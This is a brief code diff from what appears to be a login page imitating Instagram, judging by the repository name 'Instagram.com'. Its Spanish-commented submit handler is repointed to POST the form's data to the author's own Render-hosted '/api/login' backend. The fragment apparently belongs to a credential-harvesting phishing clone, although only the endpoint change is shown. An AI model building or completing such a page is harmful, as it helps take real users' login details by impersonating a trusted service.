@@ -6,7 +6,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 
     try {
         // Enviar los datos al servidor backend (Node.js/SQLite)
-        const response = await fetch('https://github.com/User-1376/Instagram.com.git', {
+        const response = await fetch('https://tu-proyecto.onrender.com/api/login', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json'
